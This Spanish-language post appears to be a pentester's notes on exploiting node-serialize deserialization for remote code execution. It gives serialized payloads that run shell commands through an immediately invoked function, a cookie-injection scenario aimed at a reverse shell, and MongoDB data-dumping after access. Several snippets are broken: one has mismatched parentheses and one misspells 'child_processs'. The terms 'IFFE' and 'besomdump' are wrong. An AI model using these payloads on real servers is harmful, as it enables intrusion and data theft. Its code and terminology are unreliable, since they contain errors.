---
title: "NodeJS Deserialization"
author: Tuch0
date: 2023-09-17
categories: [Vectores-de-Ataque]
tags: [nodjs, deserialization, MongoDB]
---



## Inyectar comando ANTES de que "serialize la data" con "IFFE"

> Recurso: https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

```js
var y = {
	rce : function(){
	require('child_process').exec('ls /'), function (error, stdout, stderr) { console.log(stdout) })
	}(),
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

> Esto ocurre gracias a los dos paréntesis , que hay despues de ejecutar el comando ya que antes de hacer la "deserialization" va a ejecutar el comando, esto es conocido como "IFFE" (inyection function)
{: .prompt-info }

## Unserialize

> De lado de un servidor que usa NodeJS , lo que hacen es deserializar la data , de esta menera vamos a a crear una data "serializada" maliciosa , de manera que cuado la "deserialize" ejecute el comando que nosotros queramos aprovechandonos de el "IFFE"
{: .prompt-info }

```js
var serialize = require('node-serialize')
var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_processs\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
serialize.unserialize(payload)
```
### Escenario

> En este caso , gracias a un XXE , hemos conseguido saber donde se situa el server.js , mirando su código nos hemos dado cuenta de que "deserializa" la data de la cookie , por lo tanto vamos a tratar de hacer una cookie serializada maliciosa para obtener una reverse shell
{: .prompt-info }

> Vamos a usar el payload de antes , y vamos a urlEncodearlo , para ponerlo en la cookie , cabe destacar que si da erro , le quitemos los saltos de linea
{: .prompt-info }

```js
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ping -c 1 10.10.14.27', function(error, stdout, stderr) { console.log(stdout) }); }()"}
```

## Otro

> Cabe destacar que antes gracias a el archivo "server.js" hemos sabido que por detrás corre mongo , por lo tanto una vez dentro de la máquina , podemos conectarnos usando el comando "mongo"
{: .prompt-info }

> Si no sabemos usar mongo basta con conectarnos con "mongo" y luego poner "mongo dump", esto creara un directorio con todos los archivos de mongo, si con cat , lo reporta un poco feo , puedes usar el comando besomdump
{: .prompt-info }




